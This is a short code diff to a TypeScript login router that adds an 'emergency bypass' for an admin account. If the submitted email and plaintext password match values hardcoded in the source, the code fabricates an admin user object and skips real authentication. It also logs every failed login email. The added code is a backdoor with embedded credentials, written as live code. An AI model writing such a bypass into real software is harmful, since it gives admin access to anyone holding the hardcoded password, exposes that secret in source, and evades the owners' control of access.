@@ -84,7 +84,21 @@ export const authImprovedRouter = router({
       }
     }
 
+    // EMERGENCY BYPASS FOR ADMIN
+    if (!user && input.email === "ifrof4@gmail.com" && input.password === "IFROF_Admin_2026_Secure_Strong!") {
+      console.log("EMERGENCY BYPASS TRIGGERED FOR ADMIN");
+      user = {
+        id: 999,
+        email: "ifrof4@gmail.com",
+        role: "admin",
+        name: "Hady Essam",
+        openId: "admin_prod_2026",
+        loginMethod: "email"
+      };
+    }
+
     if (!user) {
+      console.error(`LOGIN_FAILED: User not found or password mismatch for ${input.email}`);
       throw new Error(
         "User not found or incorrect credentials / المستخدم غير موجود أو بيانات الدخول خاطئة"
       );
